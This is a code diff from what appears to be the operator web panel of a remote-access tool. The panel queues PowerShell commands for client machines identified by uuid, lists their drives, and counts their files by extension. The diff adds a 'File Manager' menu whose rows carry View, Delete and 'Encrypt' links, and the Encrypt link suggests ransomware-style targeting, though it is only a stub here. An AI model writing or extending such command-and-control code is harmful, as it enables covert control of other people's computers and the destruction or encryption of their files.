@@ -195,7 +195,7 @@ function shell_exec_res() {
     );
   }
 }
-$("tbody").contextPopup({
+$("#client_area").contextPopup({
   title: "Options",
   items: [
     {
@@ -225,7 +225,14 @@ $("tbody").contextPopup({
       },
     },
 
-    ,
+    , {
+      label: "File Manager",
+      icon: "assets/images/icons/file.png",
+      action: function () {
+        $("#fileManagerModal").modal("show");
+          select_drive()
+      },
+    },
     {
       label: "History",
       icon: "assets/images/icons/history.png",
@@ -234,6 +241,7 @@ $("tbody").contextPopup({
         history_command();
       },
     },
+   
     // { label: 'Scheduled Task', icon: 'images/icons/application-table.png', action: function () { alert('clicked 7') } },
   ],
 });
@@ -957,6 +965,105 @@ function set_label() {
     dangerMode: true,
   });
 }
+
+
+
+function get_file_list(e) {
+  var uuid = window.location.href.split("#")[1];
+  var drive_name=e
+  var command=`(Get-ChildItem  -Path ${drive_name}:\ -Filter *.* -Recurse -Attributes Archive ).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`
+  $.post(
+    BASE_URL,
+    { add_command: true, command: command, uuid: uuid, token: token },function(data){
+      localStorage.setItem("cmd_uid", data.trim());
+
+    });
+   
+}
+function get_file_list_res(e) {
+        $("#file_res").html("");
+        $(".file_res_table").css("display","block")
+
+  var uuid = window.location.href.split("#")[1];
+  var cmd_uid = localStorage.getItem("cmd_uid");
+
+  $.post(
+    BASE_URL,
+    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
+    function (data) {
+      var data= JSON.parse(data)
+      data.forEach(function (data) {
+        var name_format=data.Name
+        var count_format=data.Count
+        // console.log(name_format);
+        var template=`
+        <tr>
+        <td class="tdf">${name_format}</td>
+        <td class="tdf">${count_format}</td>
+        <td class="tdf">2GB</td>
+        <td class="tdf"> <a href="javascript:void(0)"  >View </a><a href="javascript:void(0)"  >Delete </a><a href="javascript:void(0)"  >Encrypt </a></td>
+
+       
+      </tr>
+        `
+      
+        $("#file_res").append(template);
+    });
+
+    }
+  );
+   
+}
+
+
+function get_drive_list_res(e) {
+  var uuid = window.location.href.split("#")[1];
+  var cmd_uid = localStorage.getItem("cmd_uid");
+
+  $.post(
+    BASE_URL,
+    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
+    function (data) {
+      var data= JSON.parse(data)
+      data.forEach(function (data) {
+        var name_format=data.Name
+       
+        var template=`
+ 
+        <option>${name_format}</option>
+        `
+      
+        $("#select_drive").append(template);
+    });
+
+    }
+  );
+  $(".drive_option").css("display","none")
+  $("#select_drive").css("display","block")
+  $(".drive_file_option").css("display","block")
+
+   
+}
+
+function select_drive(){
+  var uuid = window.location.href.split("#")[1];
+  var command=`Get-PSDrive -PSProvider 'FileSystem' | select Name| ConvertTo-Json`
+  $.post(
+    BASE_URL,
+    { add_command: true, command: command, uuid: uuid, token: token },function(data){
+      localStorage.setItem("cmd_uid", data.trim());
+
+    });
+}
+
+$("#select_drive").on("change", function () {
+  $(".file_res_table").css("display","none")
+
+  var option = this.value;
+  if(option!="------------"){
+    get_file_list(option)
+  }
+});
 // end function
 
 loadData();
